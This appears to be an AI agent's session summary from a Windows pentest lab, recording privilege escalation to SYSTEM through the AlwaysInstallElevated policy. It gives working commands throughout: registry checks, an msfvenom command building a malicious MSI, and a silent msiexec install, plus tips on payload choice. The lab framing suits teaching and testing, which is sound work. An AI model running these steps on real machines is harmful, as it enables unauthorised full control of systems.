thread_id: 01906aec-45a4-77d1-8cbc-73b8a3a86cf1
updated_at: 2026-05-19T02:19:15+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\05\19\rollout-2026-05-19T09-42-15-01906aec-45a4-77d1-8cbc-73b8a3a86cf1.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# Went from user to SYSTEM via AlwaysInstallElevated policy on a lab Windows 10 VM — generated an MSI with msfvenom, installed it.

Rollout context: cwd was `C:\Workspace\pentest-lab`, Windows 10 lab VM with `HKCU/HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1` set for the exercise.

## Task 1: Confirm AlwaysInstallElevated → generate MSI → install → SYSTEM shell

Outcome: success

Preference signals:
- Chinese narration; PowerShell + msfvenom in English.
- Payload should be a simple `cmd.exe /c cmd.exe` (spawn interactive) — no beacon for the exercise.

Key steps:
- Verified policy: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` → 0x1. Same for HKLM.
- Generated MSI with msfvenom: `msfvenom -p windows/x64/exec CMD="cmd.exe" -f msi -o payload.msi`.
- Installed silently: `msiexec /quiet /qn /i payload.msi`.
- cmd.exe window spawned as SYSTEM.

Failures and how to do differently:
- Initial payload used `windows/x64/shell_reverse_tcp` — for the lab exercise a plain `exec CMD=cmd.exe` is cleaner and works offline.
- Ran `msiexec /i` without `/quiet`; a UI dialog appeared. `/quiet /qn` bypasses that.

Reusable knowledge:
- AlwaysInstallElevated is rare in production but shows up on lab VMs / poorly-configured domain policies. `reg query` on the two keys is a 1-second check.
- If BOTH HKCU and HKLM keys are set to 1, all users can install as SYSTEM. If only one is set, it's not exploitable.
- msfvenom's MSI generator is fine for lab work; for a bespoke MSI use WiX Toolset.

References:
- [1] Payload: `payload.msi` (msfvenom)
- [2] Test VM: Windows 10 22H2
- [3] Reference: PayloadsAllTheThings Windows privesc AlwaysInstallElevated section
